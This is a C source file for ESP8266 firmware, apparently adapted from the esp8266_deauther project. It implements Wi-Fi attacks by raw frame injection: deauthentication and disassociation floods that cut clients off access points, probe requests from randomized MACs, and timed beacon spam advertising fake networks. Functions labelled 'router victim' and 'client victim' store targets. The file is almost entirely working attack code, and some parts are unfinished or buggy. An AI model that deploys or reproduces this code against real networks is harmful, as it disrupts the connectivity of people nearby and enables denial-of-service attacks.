#include <c_types.h>
#include <mem.h>
#include <ets_sys.h>
#include <osapi.h>
#include <user_interface.h>
#include <queue.h>

#include "modules/hashtable/hashtable.h"

#include "user_config.h"
#include "user_packets.h"
#include "user_attack.h"
#include "user_network.h"
#include "user_names.h"
#include "user_sniffer.h"
#include "user_time.h"

/**
 * Attack foundations from:
 *
 * https://github.com/spacehuhn/esp8266_deauther/tree/master/esp8266_deauther
 */

// Features
static os_timer_t timer;
hash_t *clients_hash;
hash_t *routers_hash;
static uint8_t current_channel;
static uint32_t ts_nodes = 0;
static uint8_t white_list[2][MAC_ADDR_LEN] =
{
    { 0x77, 0xEA, 0x3A, 0x8D, 0xA7, 0xC8 },
    { 0x40, 0x65, 0xA4, 0xE0, 0x24, 0xDF }
};

// Beacon features
static struct fake_router_info *spam_beacon = NULL;
SLIST_HEAD(fake_router_info_head, fake_router_info) fakes_list;

// Probe features
static uint32_t client_mac_cnt = 0;
static uint8_t random_client_mac[6];

/******************************************************************************
 * Fake SSID generator
 *******************************************************************************/
void ICACHE_FLASH_ATTR
pick_fake_ssid(uint8_t *buf)
{
    uint8_t pick = os_random() % (TOTAL_FAKE_SSID - 1);
    os_sprintf(buf, fake_ssid[pick], 1 + (os_random() % 98));
}

/******************************************************************************
 * Feed fake router list
 *******************************************************************************/
void ICACHE_FLASH_ATTR
feed_fake_routers(void)
{
    uint8_t i, buf[MAX_SSID_LEN];
    uint8_t random_mac[6];

    // Generate random mac
    user_get_random_mac(random_mac);

    // Init fake routers list
    SLIST_INIT(&fakes_list);

    // Feed fake routers list
    for(i = 0; i < MAX_FAKE_NETWORKS; ++i)
    {
        struct fake_router_info *info = NULL;
        info = (struct fake_router_info *) os_malloc(sizeof(struct fake_router_info));

        // SSID
        os_memset(buf, 0, MAX_SSID_LEN);
        pick_fake_ssid(buf);
        os_memcpy(&info->ssid, buf, os_strlen(buf) + 1);

        // MAC
        random_mac[5] = (i + 1);
        os_memcpy(&info->bssid, random_mac, MAC_ADDR_LEN);

        SLIST_INSERT_HEAD(&fakes_list, info, next);
        spam_beacon = info;
    }
}

/******************************************************************************
 * Send packet (no socket, through PHY)
 *******************************************************************************/
void ICACHE_FLASH_ATTR
send_packet(uint8_t* packet, uint16_t packet_size, uint16_t repeat)
{
    // Send
    uint8_t i = 0;
    for (i = 0; i < repeat; i++)
    {
        wifi_send_pkt_freedom(packet, packet_size, 0);
        os_delay_us(1000);
    }
}

/******************************************************************************
 * Deauth packets
 *******************************************************************************/
void ICACHE_FLASH_ATTR
attack_deauth(uint8_t* ap_mac, uint8_t* client_mac, uint8_t reason, uint8_t channel)
{
    bool success = false;

    // Build deauth packet
    uint16_t packet_size = sizeof(deauth_packet);
    os_memcpy(&deauth_packet[4], client_mac, MAC_ADDR_LEN);
    os_memcpy(&deauth_packet[10], ap_mac, MAC_ADDR_LEN);
    os_memcpy(&deauth_packet[16], ap_mac, MAC_ADDR_LEN);
    deauth_packet[24] = reason;

    // Send deauth frame
    deauth_packet[0] = 0xc0;
    send_packet(deauth_packet, packet_size, 2);

    // Send disassociate frame
    deauth_packet[0] = 0xa0;
    send_packet(deauth_packet, packet_size, 2);

    // Send another packet now from AP to Client only if the packet isn't a broadcast
    if (!user_is_mac_broadcast(client_mac))
    {
        // Build deauth packet
        os_memcpy(&deauth_packet[4], ap_mac, MAC_ADDR_LEN);
        os_memcpy(&deauth_packet[10], client_mac, MAC_ADDR_LEN);
        os_memcpy(&deauth_packet[16], client_mac, MAC_ADDR_LEN);

        // Send deauth frame
        deauth_packet[0] = 0xc0;
        send_packet(deauth_packet, packet_size, 2);

        // Send disassociate frame
        deauth_packet[0] = 0xa0;
        send_packet(deauth_packet, packet_size, 2);
    }
}

/******************************************************************************
 * Probe request packet
 *******************************************************************************/
void ICACHE_FLASH_ATTR
attack_probe(const char* ssid, uint8_t channel)
{
    uint16_t packet_size = sizeof(probe_packet);
    uint8_t ssid_len = os_strlen(ssid);

    // Normalize SSID
    if (ssid_len > MAX_SSID_LEN)
        ssid_len = MAX_SSID_LEN;

    // Mac
    random_client_mac[5] = ++client_mac_cnt;

    // Build probe packet
    os_memcpy(&probe_packet[10], random_client_mac, MAC_ADDR_LEN);
    os_memcpy(&probe_packet[26], ssid, ssid_len);

    // Send
    send_packet(probe_packet, packet_size, 3);
}

/******************************************************************************
 * Beacon packet
 *******************************************************************************/
void ICACHE_FLASH_ATTR
attack_beacon(uint8_t* mac, const char* ssid, uint8_t channel, bool wpa2)
{
    uint16_t packet_size = sizeof(beacon_packet);

    // WPA2
    if (wpa2)
    {
        beacon_packet[34] = 0x31;
    }
    else
    {
        beacon_packet[34] = 0x21;
        packet_size -= 26;
    }

    // MAC
    os_memcpy(&beacon_packet[10], mac, MAC_ADDR_LEN);
    os_memcpy(&beacon_packet[16], mac, MAC_ADDR_LEN);

    // SSID
    int ssid_len = os_strlen(ssid);
    if (ssid_len > MAX_SSID_LEN)
        ssid_len = MAX_SSID_LEN;

    // SSID len will be always 32
    os_memset(&beacon_packet[38], ' ', MAX_SSID_LEN);
    os_memcpy(&beacon_packet[38], ssid, ssid_len);

    // Channel
    beacon_packet[82] = channel;

    // Send
    send_packet(beacon_packet, packet_size, 3);
}

/******************************************************************************
 * Attack tick callback
 *******************************************************************************/
void ICACHE_FLASH_ATTR
user_attack_tick_cb(void)
{
    // Spam beacon
    spam_beacon = SLIST_NEXT(spam_beacon, next);
    if(spam_beacon == NULL)
        spam_beacon = SLIST_FIRST(&fakes_list);
    attack_beacon(spam_beacon->bssid, spam_beacon->ssid, current_channel, TRUE);


   // Schedule next
   os_timer_arm(&timer, BEACON_SPAM_DELAY, 0);
}

/******************************************************************************
 * Attack tick callback
 *******************************************************************************/
void ICACHE_FLASH_ATTR
user_batch_attack(uint32_t millis)
{
    // Probes

    // Deauths
}

/******************************************************************************
 * Save router victim
 *******************************************************************************/
void user_attack_router_target(struct router_info *router)
{
    // TODO: use bssid as key, check whitelist before
    if(hash_lookup(routers_hash, "key") == NULL)
    {
        struct router_info *info = NULL;
        info = (struct router_info *) os_malloc(sizeof(struct router_info));
        os_memcpy(&info, &router, sizeof(router));
        hash_insert(routers_hash, "key", router);
    }
}

/******************************************************************************
 * Save client victim
 *******************************************************************************/
void user_attack_client_target(struct client_info *client)
{
    // TODO: use mac as key, check whitelist before
    if(hash_lookup(clients_hash, "key") == NULL)
    {
        struct client_info *info = NULL;
        info = (struct client_info *) os_malloc(sizeof(struct client_info));
        os_memcpy(&info, &client, sizeof(client));
        hash_insert(clients_hash, "key", client);
    }
}

/******************************************************************************
 * Channel update
 *******************************************************************************/
void user_attack_set_channel(uint8_t channel)
{
    current_channel = channel;

    // Update client mac
    client_mac_cnt = 0;
    user_get_random_mac(random_client_mac);

    // Clean targets
    os_free(clients_hash);
    clients_hash = hash_create(MAX_TRACKED_CLIENTS);
}

/******************************************************************************
 * Attack setup
 *******************************************************************************/
void ICACHE_FLASH_ATTR
user_attacks_init(uint8_t channel)
{
   // Setups
   current_channel = channel;
   clients_hash = hash_create(MAX_TRACKED_CLIENTS);
   routers_hash = hash_create(MAX_TRACKED_ROUTERS);
   feed_fake_routers();

   // Beacon spam timer
   os_timer_disarm(&timer);
   os_timer_setfn(&timer, (os_timer_func_t*) &user_attack_tick_cb, 0);
   os_timer_arm(&timer, BEACON_SPAM_DELAY, 0);
}